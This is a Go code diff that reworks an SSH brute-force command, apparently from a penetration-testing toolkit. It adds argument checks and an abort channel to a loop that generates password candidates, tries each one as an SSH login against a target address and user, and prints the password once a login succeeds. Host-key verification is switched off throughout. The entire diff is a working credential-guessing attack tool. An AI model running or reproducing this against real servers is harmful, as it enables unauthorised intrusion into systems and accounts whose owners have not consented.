@@ -4,11 +4,9 @@ import (
 	"fmt"
 	"net"
 	"runtime"
-	"strconv"
-
-	tm "github.com/buger/goterm"
 	"github.com/ngirot/BruteForce/bruteforce/words"
 	"golang.org/x/crypto/ssh"
+	"github.com/fatih/color"
 )
 
 type SshBruteForceCommand struct {
@@ -23,70 +21,58 @@ func (command SshBruteForceCommand) String() string {
 	return "<Command 'sshBruteForce'>"
 }
 
-var trys = 0
-var enabled = true
+func (command SshBruteForceCommand) Execute(kill chan bool, args []string) {
 
-func (command SshBruteForceCommand) Execute(args []string) {
+	if len(args) < 2 {
+		fmt.Fprintln(color.Output, color.RedString("Usage: <address> <user>"))
+		return
+	}
 
 	address := args[0]
 	user := args[1]
 
-	/*
-		// TODO: Add breaker, which ends the action on ^C
-		go func() {
-			reader := bufio.NewReader(os.Stdin)
-			for true {
-				text, err := reader.ReadString('\n')
-				if err != nil {
-					fmt.Println(err)
-				}
-				if strings.EqualFold(text, "^C") {
-					enabled = false
-				}
+	var tries = 0
+
+	var worder = words.NewWorder(words.DefaultAlphabet(), numberOfChans, 0)
+	for {
+		select {
+		case <-kill:
+			fmt.Println("Aborted.")
+			return
+		default:
+			var curPwd = worder.Next()
+			err := trySSHConnection(address, user, curPwd)
+			tries++
+			if !err {
+				fmt.Printf("Success, your password is: %s\nTook %d tries\n", curPwd, tries)
+				return
+			}
+			if tries%100000 == 0 {
+				fmt.Printf("\rTook %d tries without result.", tries)
 
 			}
-		}()*/
-
-	for enabled {
-		result, err := trySSHConnection(address, user)
-		if result {
-			fmt.Println("Success, your password is: " + currentPassword)
-			break
-		} else {
-			trys++
-			tm.Println("Trys: " + strconv.Itoa(trys) + ";Error: " + err.Error() + "; Current Password: " + currentPassword)
-			tm.Flush()
 		}
 	}
 }
 
-var alphabet = words.DefaultAlphabet()
 var numberOfChans = runtime.NumCPU()*2 + 1
-var worder = words.NewWorder(alphabet, numberOfChans, 0)
-var currentPassword = ""
 
-func trySSHConnection(address string, user string) (result bool, erro error) {
-
-	currentPassword = worder.Next()
-
+func trySSHConnection(address string, user string, pass string) (bool) {
 	config := &ssh.ClientConfig{
 		User: user,
 		Auth: []ssh.AuthMethod{
-			ssh.Password(currentPassword),
+			ssh.Password(pass),
 		},
 		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
 			return nil
 		},
 	}
 
-	conn, err := ssh.Dial("tcp", address, config)
-	if err != nil {
-		result = false
-		erro = err
-		return
-	}
-	defer conn.Close()
-	result = true
-	erro = nil
-	return
+	client,  err := ssh.Dial("tcp", address, config)
+	defer func() {
+		if client != nil {
+			client.Close()
+		}
+	}()
+	return err != nil
 }
